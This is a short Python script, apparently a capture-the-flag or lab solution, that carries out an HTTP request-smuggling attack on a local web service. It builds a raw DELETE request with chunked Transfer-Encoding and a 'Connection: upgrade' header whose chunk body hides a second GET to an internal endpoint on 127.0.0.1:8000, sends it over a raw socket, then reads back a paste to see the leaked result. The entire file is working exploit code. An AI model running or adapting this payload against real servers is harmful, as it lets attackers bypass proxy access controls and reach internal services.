import socket
import ssl
from urllib.parse import ParseResult, urlparse

import requests

endpoint = "http://localhost:3000/api"
parsed_ep = urlparse(endpoint)


def create_socket(endpoint: ParseResult) -> socket.socket | ssl.SSLSocket:
    if not endpoint.hostname:
        raise ValueError("endpoint must include a hostname")

    port = endpoint.port or (443 if endpoint.scheme == "https" else 80)
    tcp_socket = socket.create_connection((endpoint.hostname, port))

    if endpoint.scheme == "https":
        context = ssl.create_default_context()
        return context.wrap_socket(tcp_socket, server_hostname=endpoint.hostname)

    return tcp_socket


def smuggle_request(sock: socket.socket | ssl.SSLSocket, endpoint: ParseResult) -> str:
    # fmt: off
    smuggled_request = \
        f"GET /internal/visible?id=1 HTTP/1.1\r\n" \
        f"Host: 127.0.0.1:8000\r\n\r\n"
    payload = \
        f"DELETE /api/paste?id=abdef HTTP/1.1\r\n" \
        f"Host: 127.0.0.1:{endpoint.port}\r\n" \
        f"Transfer-Encoding: chunked\r\n" \
        "Connection: upgrade\r\n\r\n" \
        f"{hex(len(smuggled_request))[2:].upper()}\r\n" \
        f"{smuggled_request}" \
        "\r\n0\r\n\r\n"
    # fmt: on

    print(payload)

    sock.sendall(payload.encode("utf-8"))
    res = []
    while True:
        chunk = sock.recv(4096)
        if not chunk:
            break
        res.append(chunk)
    return b"".join(res).decode("utf-8")


sock = create_socket(parsed_ep)
response = smuggle_request(sock, parsed_ep)

r = requests.get(f"{endpoint}/paste?id=1")
print(r.text)
